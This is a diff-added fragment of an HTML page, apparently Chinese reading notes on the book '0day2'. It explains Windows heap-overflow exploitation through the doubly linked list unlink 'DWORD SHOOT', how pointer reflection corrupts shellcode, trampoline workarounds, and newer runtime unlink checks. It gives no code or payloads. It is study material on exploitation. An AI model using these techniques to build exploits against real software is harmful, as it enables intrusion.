+<a name="6b49mbbdnlr4mrojn96gr18rik">&nbsp;&nbsp;&nbsp;当将一个节点从双向链表中删除时，其指针操作可能为</a>
+</h3>
+<h3 class="topic">
+<a name="2tqohq3akdfml2o1t1p781ekh2">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/36dg8ambvbp1av7j2137t0tt7d.png"></p>
+<h3 class="topic">
+<a name="5o0rsou9r2re9ldo3u9u0i4cos">&nbsp;&nbsp;&nbsp;其中node -&gt; blink -&gt; flink = node -&gt; flink 将会导致 DWORD SHOOT，漏洞利用中flink一般为shellcode的地址，blink为目标地址，此时可以将shellcode的地址填入目标地址，</a>
+</h3>
+<h3 class="topic">
+<a name="0hu9l6apu7n7utsap510vijg06">&nbsp;&nbsp;&nbsp;但是当执行node -&gt; flink -&gt; blink = node -&gt; blink时，也会将目标地址填入shellcode起始位置偏移四字节的地方，这种现象称为指针反射</a>
+</h3>
+<h3 class="topic">
+<a name="6v5kvrb1qi8bjsksl4f4t82um2">&nbsp;&nbsp;&nbsp;指针反射会直接破坏四个字节的shellcode，如果对于仅使用DWORD SHOOT，没有使用跳板技术的exploit，意味着必须将shellcode中的目标地址当作指令执行</a>
+</h3>
+<h3 class="topic">
+<a name="3qlfdk1ln616p0toitmbrri3cm">&nbsp;&nbsp;&nbsp;&nbsp;有时目标地址组成的指令无关痛痒，不会影响shellcode的执行，比如上面狙击peb中同步函数的例子</a>
+</h3>
+<h3 class="topic">
+<a name="3cn6lmuo29n99qcjp10nj0pi2t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4lq96g1np4lds0qc59mfokvjmg.png"></p>
+<h3 class="topic">
+<a name="4h3sgtonodine71o7nplcnpjo9">&nbsp;&nbsp;&nbsp;&nbsp;当目标地址对应的指令会对shellcode产生影响，就需要使用其他目标，或跳板技术，即直接跳过目标地址对应的指令，直接执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="3s0j78u0kno41pa05rat111k59">&nbsp;在新版本的c运行库中，对于将堆块卸下空表的操作增加了验证，即前块的前驱指针必须指向被删除块。类似的，后块的后驱指针必须指向被删除块</a>
+</h3>
+<h3 class="topic">
+<a name="387qgi0uo7ujuld0fsbk2vfsp2">&nbsp;&nbsp;堆溢出的新技术</a>
+</h3>
+<h3 class="topic">
+<a name="4kl172g4ivu6k64f0hbqgh0dev">&nbsp;&nbsp;&nbsp;https://www.freebuf.com/vuls/98404.html</a>
+</h3>
+</body>
+</html>
